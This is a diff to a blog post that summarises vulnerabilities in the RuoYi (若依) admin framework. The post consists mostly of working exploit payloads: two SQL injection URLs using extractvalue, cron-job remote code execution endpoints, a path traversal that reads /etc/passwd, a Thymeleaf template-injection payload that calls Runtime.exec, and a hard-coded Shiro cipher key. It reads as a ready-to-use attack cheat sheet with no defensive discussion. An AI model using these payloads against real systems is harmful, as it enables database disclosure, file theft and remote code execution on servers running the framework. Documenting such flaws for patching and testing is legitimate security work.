@@ -3,6 +3,7 @@ layout: post
 title: "::若依:: vulnerability summary"
 date: 2022-10-08 17:00:43+800
 toc: true
+wrench: 2024-04-29
 author: Bin4xin
 categories:
 - blog
@@ -12,12 +13,17 @@ tags:
 - vulnerability
 ---
 
-mark to do.
-
 ## SQL inject
 
+### sqli-1
 ```
-https://***/prod-api/system/user/list?pageSize=&params%5bdataScope%5d=and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))
+/prod-api/system/user/list?pageSize=&params%5bdataScope%5d=and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))
+```
+
+### sqli-2
+
+```
+/prod-api/system/role/list?params%5bdataScope%5d=and+extractvalue(1,concat(0x7e,(select+database()),0x7e))
 ```
 
 ## CRON job RCE
@@ -39,7 +45,7 @@ Content-Type: application/json;charset=utf-8
 ### list
 
 ```
-https://***/prod-api/monitor/job/list
+/prod-api/monitor/job/list
 ```
 
 ### run 
@@ -55,3 +61,31 @@ Content-Type: application/json;charset=utf-8
 
 {"jobId":8,"jobGroup":"DEFAULT"}
 ```
+
+## local file read
+
+```
+/common/download/resource?resource=/profile/../../../../etc/passwd
+```
+
+## thymeleaf SSTI RCE
+
+```
+POST /monitor/cache/getNames HTTP/1.1
+
+fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open -a Calculator')}__::.x
+```
+
+```
+POST /prod-api/monitor/cache/getNames HTTP/1.1
+
+fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open -a Calculator')}__::.x
+```
+
+## Shiro
+
+`CipherKey=fCq+/xW488hMTCD+cmJ3aQ==`
+
+## ref
+
+- [RuoYi若依](https://github.com/ax1sX/SecurityList/blob/main/Java_OA/RuoYi.md)
